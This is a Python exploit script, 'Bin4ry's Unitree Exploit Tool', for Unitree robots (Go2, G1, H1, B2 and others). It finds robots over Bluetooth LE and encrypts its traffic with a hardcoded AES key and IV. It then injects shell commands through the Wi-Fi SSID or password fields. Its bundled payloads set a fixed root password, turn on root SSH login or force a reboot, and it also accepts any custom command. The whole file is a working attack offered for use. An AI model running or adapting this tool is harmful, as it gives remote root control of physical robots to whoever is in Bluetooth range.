#!/usr/bin/env python3

import asyncio
import argparse
from bleak import BleakScanner, BleakClient
from Cryptodome.Cipher import AES
import platform
import sqlite3
from datetime import datetime
import os

# UUIDs
DEVICE_NAME_UUID =      "00002a00-0000-1000-8000-00805f9b34fb"
CUSTOM_CHAR_UUID =      "0000ffe1-0000-1000-8000-00805f9b34fb"
CUSTOM_CHAR_UUID_2 =    "0000ffe2-0000-1000-8000-00805f9b34fb"
UNITREE_SERVICE_UUID =  "0000ffe0-0000-1000-8000-00805f9b34fb"

COUNTRY_CODE = "US"
HANDSHAKE_CONTENT = "unitree"
AES_KEY = bytes.fromhex("df98b715d5c6ed2b25817b6f2554124a")
AES_IV = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")
chunk_size = 14

PREDEFINED_CMDS = {
    "enable_ssh": r"echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;/etc/init.d/ssh start",
    "reboot": "reboot -f"
}

VERBOSE = False
DB_PATH = "unitree_devices.db"

def styled_print(message, verbose_only=False):
    if verbose_only and not VERBOSE:
        return
    prefix = "\033[1;32m[//]\033[0m "
    print(f"{prefix}{message}")

# Database functions
def init_db():
    """Initialize SQLite database for storing device history."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (address TEXT PRIMARY KEY, name TEXT, last_used TEXT)''')
    conn.commit()
    conn.close()

def save_device(device):
    """Save or update device in database with current timestamp."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute('''INSERT OR REPLACE INTO devices (address, name, last_used)
                 VALUES (?, ?, ?)''', (device.address, device.name, timestamp))
    c.execute('''DELETE FROM devices WHERE address NOT IN (
                 SELECT address FROM devices ORDER BY last_used DESC LIMIT 5)''')
    conn.commit()
    conn.close()

def list_recent_devices():
    """List the last 5 devices used."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT address, name, last_used FROM devices
                 ORDER BY last_used DESC LIMIT 5''')
    devices = c.fetchall()
    conn.close()
    return devices

def build_pwn(cmd):
    return f'";$({cmd});#'

def encrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV, segment_size=128)
    return cipher.encrypt(data)

def decrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV, segment_size=128)
    return cipher.decrypt(data)

async def find_robot(timeout: float = 30.0):
    styled_print("Initiating scan for Unitree robots…")
    scanner_kwargs = {
        "scanning_mode": "active",
        "activation_timeout": timeout,
    }
    scanner_kwargs["bluez"] = {"device_filter": "hci0"}
    devices_adv = await BleakScanner.discover(
        timeout=timeout,
        return_adv=True,
        **scanner_kwargs
    )
    compatible = []
    for device, adv in devices_adv.values():
        if device.name and device.name.startswith(("G1_", "Go2_", "B2_","H1_", "X1_")):
            compatible.append(device)
    if not compatible:
        styled_print("[-] No Unitree robots detected.", verbose_only=False)
        return None
    return compatible

def create_packet(instruction, data_bytes=None):
    instruction_data = [instruction]
    if data_bytes:
        instruction_data.extend(data_bytes)
    length = len(instruction_data) + 3
    full_data = [0x52, length] + instruction_data
    checksum = -sum(full_data) & 0xFF
    plain_data = full_data + [checksum]
    return encrypt_data(bytes(plain_data))

def generic_response_validator(response, expected_instruction):
    if len(response) < 5:
        styled_print("[-] Response packet corrupted: too short", verbose_only=False)
        return False
    if response[0] != 0x51:
        styled_print("[-] Invalid opcode in response", verbose_only=False)
        return False
    if len(response) != response[1]:
        styled_print("[-] Packet length mismatch", verbose_only=False)
        return False
    if response[2] != expected_instruction:
        styled_print(f"[-] Instruction mismatch: Expected {expected_instruction}, Got {response[2]}", verbose_only=False)
        return False
    expected_checksum = -sum(response[:-1]) & 0xFF
    if response[-1] != expected_checksum:
        styled_print(f"[-] Checksum failure: Expected {hex(expected_checksum)}, Got {hex(response[-1])}", verbose_only=False)
        return False
    return response[3] == 0x01

async def wait_for_notification(event, received_value, validator, timeout=10.0):
    try:
        await asyncio.wait_for(event.wait(), timeout)
        if validator(received_value[0]):
            styled_print("Packet validated successfully", verbose_only=True)
            return received_value[0]
        else:
            styled_print("[-] Packet validation failed", verbose_only=False)
            raise ValueError("Invalid notification")
    except asyncio.TimeoutError:
        styled_print("[-] Timeout: No packet received from target", verbose_only=False)
        raise

async def connect_and_configure_wifi(device, handshake_content, ssid, password, country_code, retries=3):
    for attempt in range(retries):
        try:
            async with BleakClient(device.address, timeout=30.0) as client:
                notification_event = asyncio.Event()
                received_value = [None]
                serial_chunks = {}

                async def notification_handler(sender, data):
                    decrypted_value = decrypt_data(data)
                    if len(decrypted_value) < 5 or decrypted_value[0] != 0x51:
                        styled_print("[-] Corrupted notification packet", verbose_only=False)
                        return
                    response_type = decrypted_value[2]
                    if response_type == 0x02:
                        chunk_index = decrypted_value[3]
                        total_chunks = decrypted_value[4]
                        chunk_data = decrypted_value[5:-1]
                        serial_chunks[chunk_index] = chunk_data
                        if len(serial_chunks) == total_chunks:
                            serial_number = b"".join(serial_chunks[i] for i in sorted(serial_chunks.keys()))
                            serial_number_str = serial_number.decode('utf-8').rstrip('\x00')
                            styled_print(f"Serial number extracted: {serial_number_str}", verbose_only=False)
                            serial_chunks.clear()
                            notification_event.set()
                    else:
                        received_value[0] = decrypted_value
                        notification_event.set()

                try:
                    await client.start_notify(CUSTOM_CHAR_UUID, notification_handler)
                    styled_print("Hooked into notification stream", verbose_only=True)
                except Exception as e:
                    styled_print(f"[-] Primary hook failed: {e}, switching to backup handle 13", verbose_only=False)
                    await client.start_notify(13, notification_handler)
                    styled_print("Backup hook established on handle 13", verbose_only=True)

                styled_print(f"Transmitting handshake: {handshake_content}", verbose_only=True)
                handshake_bytes = handshake_content.encode('utf-8')
                handshake_packet = create_packet(instruction=1, data_bytes=[0, 0] + list(handshake_bytes))
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, handshake_packet, response=True)
                await wait_for_notification(notification_event, received_value,
                                          lambda r: generic_response_validator(r, expected_instruction=1))
                notification_event.clear()

                styled_print("Getting serial number ...", verbose_only=True)
                serial_packet = create_packet(instruction=2, data_bytes=[0])
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, serial_packet, response=True)
                await asyncio.wait_for(notification_event.wait(), timeout=2.0)
                notification_event.clear()

                styled_print("Initializing network interface (STA mode)", verbose_only=True)
                init_packet = create_packet(instruction=3, data_bytes=[2])
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, init_packet, response=True)
                await wait_for_notification(notification_event, received_value,
                                          lambda r: generic_response_validator(r, expected_instruction=3))
                notification_event.clear()

                styled_print(f"Uploading SSID: {ssid}", verbose_only=True)
                ssid_bytes = ssid.encode('utf-8')
                total_chunks = (len(ssid_bytes) + chunk_size - 1) // chunk_size
                for i in range(total_chunks):
                    start = i * chunk_size
                    chunk = ssid_bytes[start:start + chunk_size]
                    packet = create_packet(instruction=4, data_bytes=[i + 1, total_chunks] + list(chunk))
                    await client.write_gatt_char(CUSTOM_CHAR_UUID_2, packet, response=True)
                    if i + 1 == total_chunks:
                        await wait_for_notification(notification_event, received_value,
                                                  lambda r: generic_response_validator(r, expected_instruction=4))
                        notification_event.clear()

                styled_print(f"Uploading password: {password}", verbose_only=True)
                pass_bytes = password.encode('utf-8')
                total_chunks = (len(pass_bytes) + chunk_size - 1) // chunk_size
                for i in range(total_chunks):
                    start = i * chunk_size
                    chunk = pass_bytes[start:start + chunk_size]
                    packet = create_packet(instruction=5, data_bytes=[i + 1, total_chunks] + list(chunk))
                    await client.write_gatt_char(CUSTOM_CHAR_UUID_2, packet, response=True)
                    await asyncio.sleep(0.1)
                    if i + 1 == total_chunks:
                        await wait_for_notification(notification_event, received_value,
                                                  lambda r: generic_response_validator(r, expected_instruction=5),
                                                  timeout=5.0)
                        notification_event.clear()

                styled_print(f"Setting region: {country_code}", verbose_only=True)
                country_code_bytes = country_code.encode('utf-8') + b'\x00'
                country_packet = create_packet(instruction=6, data_bytes=[1] + list(country_code_bytes))
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, country_packet, response=True)
                await wait_for_notification(notification_event, received_value,
                                          lambda r: generic_response_validator(r, expected_instruction=6))
                notification_event.clear()

                styled_print("Job finished.", verbose_only=False)
                save_device(device)
                return
        except Exception as e:
            styled_print(f"[-] Attempt {attempt + 1}/{retries} failed: {e}", verbose_only=False)
            if attempt + 1 < retries:
                styled_print("Repeating...", verbose_only=False)
                await asyncio.sleep(1)
            else:
                raise

async def select_device():
    """Allow user to select a device from recent devices or scan for new ones."""
    recent_devices = list_recent_devices()
    
    if recent_devices:
        styled_print("Recent devices:", verbose_only=False)
        for i, (address, name, last_used) in enumerate(recent_devices, 1):
            styled_print(f"  {i}. {name} ({address}) - Last used: {last_used}", verbose_only=False)
        styled_print(f"  {len(recent_devices) + 1}. Scan for new devices", verbose_only=False)
        
        while True:
            try:
                choice = int(input("\033[1;32m[//] Select device (1-{}): \033[0m".format(len(recent_devices) + 1)))
                if 1 <= choice <= len(recent_devices):
                    address, name, _ = recent_devices[choice - 1]
                    device = type('Device', (), {'address': address, 'name': name})()
                    return device
                elif choice == len(recent_devices) + 1:
                    devices = await find_robot(timeout=30.0)
                    if not devices:
                        return None
                    return devices[0] if devices else None
                else:
                    styled_print("[-] Invalid selection.", verbose_only=False)
            except ValueError:
                styled_print("[-] Input error. Enter a valid number.", verbose_only=False)
    else:
        styled_print("No recent devices found. Scanning for new devices...", verbose_only=False)
        devices = await find_robot(timeout=30.0)
        return devices[0] if devices else None

async def main(ssid, password, cmd):
    device = await select_device()
    if not device:
        styled_print("[-] No device selected or found.", verbose_only=False)
        return
    await connect_and_configure_wifi(device, HANDSHAKE_CONTENT, ssid, password, COUNTRY_CODE)

def get_user_input(args):
    if args.enable_ssh or args.reboot:
        cmd_name = "enable_ssh" if args.enable_ssh else "reboot"
        cmd = PREDEFINED_CMDS[cmd_name]
        styled_print(f"Selected payload: {cmd_name}", verbose_only=False)
        if cmd_name == "enable_ssh":
            styled_print("SSH login will be set to: user: root, password: Bin4ryWasHere", verbose_only=False)
        if args.wifi_ssid and args.wifi_pwd:
            ssid = args.wifi_ssid
            password = args.wifi_pwd + build_pwn(cmd)
            styled_print(f"Using Wi-Fi SSID: {ssid}", verbose_only=False)
            styled_print(f"Appending command to Wi-Fi password", verbose_only=True)
        else:
            ssid = build_pwn(cmd)
            password = ""
            styled_print("No Wi-Fi credentials provided; injecting command as SSID", verbose_only=False)
        return ssid, password, cmd

    styled_print("Select operation mode:", verbose_only=False)
    styled_print("  1. Run command only (injected via SSID)", verbose_only=False)
    styled_print("  2. Run command and configure Wi-Fi (command appended to password)", verbose_only=False)
    styled_print("  3. Configure Wi-Fi credentials only (no command injection)", verbose_only=False)

    while True:
        try:
            mode_choice = int(input("\033[1;32m[//] Select mode (1-3): \033[0m"))
            if mode_choice in [1, 2, 3]:
                break
            styled_print("[-] Invalid selection. Choose 1, 2, or 3.", verbose_only=False)
        except ValueError:
            styled_print("[-] Input error. Enter a valid number (1, 2, or 3).", verbose_only=False)

    if mode_choice == 3:
        while True:
            ssid = input("\033[1;32m[//] Enter Wi-Fi SSID: \033[0m")
            password = input("\033[1;32m[//] Enter Wi-Fi Password: \033[0m")
            if ssid.strip() and password.strip():
                styled_print(f"Configuring Wi-Fi with SSID: {ssid}", verbose_only=False)
                return ssid, password, None
            styled_print("[-] SSID and password cannot be empty.", verbose_only=False)

    styled_print("Available payloads:", verbose_only=False)
    for i, cmd_name in enumerate(PREDEFINED_CMDS.keys(), 1):
        styled_print(f"  {i}. {cmd_name}", verbose_only=False)
    styled_print(f"  {len(PREDEFINED_CMDS) + 1}. Custom payload", verbose_only=False)

    while True:
        try:
            choice = int(input("\033[1;32m[//] Select payload (1-{}): \033[0m".format(len(PREDEFINED_CMDS) + 1)))
            if 1 <= choice <= len(PREDEFINED_CMDS):
                cmd_name = list(PREDEFINED_CMDS.keys())[choice - 1]
                cmd = PREDEFINED_CMDS[cmd_name]
                styled_print(f"Selected payload: {cmd_name}", verbose_only=False)
                if cmd_name == "enable_ssh":
                    styled_print("SSH login will be set to: user: root, password: Bin4ryWasHere", verbose_only=False)
            elif choice == len(PREDEFINED_CMDS) + 1:
                cmd = input("\033[1;32m[//] Enter custom payload: \033[0m")
                styled_print(f"Selected custom payload: {cmd}", verbose_only=False)
            else:
                styled_print(f"[-] Invalid payload selection. Choose between 1 and {len(PREDEFINED_CMDS) + 1}.", verbose_only=False)
                continue
            break
        except ValueError:
            styled_print("[-] Input error. Enter a valid payload number.", verbose_only=False)

    if mode_choice == 1:
        ssid = build_pwn(cmd)
        password = ""
        styled_print("Command will be injected via SSID", verbose_only=False)
    else:
        while True:
            ssid = input("\033[1;32m[//] Enter Wi-Fi SSID: \033[0m")
            password = input("\033[1;32m[//] Enter Wi-Fi Password: \033[0m")
            if ssid.strip() and password.strip():
                password = password + build_pwn(cmd)
                styled_print(f"Using Wi-Fi SSID: {ssid}", verbose_only=False)
                styled_print(f"Appending command to Wi-Fi password", verbose_only=True)
                break
            styled_print("[-] SSID and password cannot be empty.", verbose_only=False)
            styled_print("Falling back to command-only mode? (y/n): ", verbose_only=False)
            if input().lower() == 'y':
                ssid = build_pwn(cmd)
                password = ""
                styled_print("Command will be injected via SSID", verbose_only=False)
                break

    return ssid, password, cmd

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bin4ry's Unitree Go2 and G1 Infiltration Tool")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--enable-ssh", action="store_true", help="Quick select enable_ssh command")
    parser.add_argument("--reboot", action="store_true", help="Quick select reboot command")
    parser.add_argument("--wifi-ssid", type=str, help="Wi-Fi SSID to use for connection")
    parser.add_argument("--wifi-pwd", type=str, help="Wi-Fi password to use for connection")
    args = parser.parse_args()

    if args.enable_ssh and args.reboot:
        styled_print("[-] Error: Cannot use both --enable-ssh and --reboot simultaneously.", verbose_only=False)
        exit(1)
    if (args.wifi_ssid or args.wifi_pwd) and not (args.enable_ssh or args.reboot):
        styled_print("[-] Error: --wifi-ssid and --wifi-pwd require either --enable-ssh or --reboot.", verbose_only=False)
        exit(1)
    if (args.wifi_ssid and not args.wifi_pwd) or (args.wifi_pwd and not args.wifi_ssid):
        styled_print("[-] Error: Both --wifi-ssid and --wifi-pwd must be provided together.", verbose_only=False)
        exit(1)

    VERBOSE = args.verbose
    init_db()

    print("\033[1;32m")
    print("+========================================+")
    print("|   Bin4ry's Unitree Exploit Tool (v2.6) |")
    print("| supported devices: Go2, G1, H1, B2 ... |")
    print("+========================================+")
    print("  Shouts to h0stile, legion1581")
    print("            8th May 2025")
    print("  Updated: 25th Sep 2025")
    print("\033[0m")

    try:
        ssid, password, cmd = get_user_input(args)
        asyncio.run(main(ssid, password, cmd))
    except KeyboardInterrupt:
        styled_print("[-] Operation aborted by operator.", verbose_only=False)
    except Exception as e:
        styled_print(f"[-] Critical failure: {e}", verbose_only=False)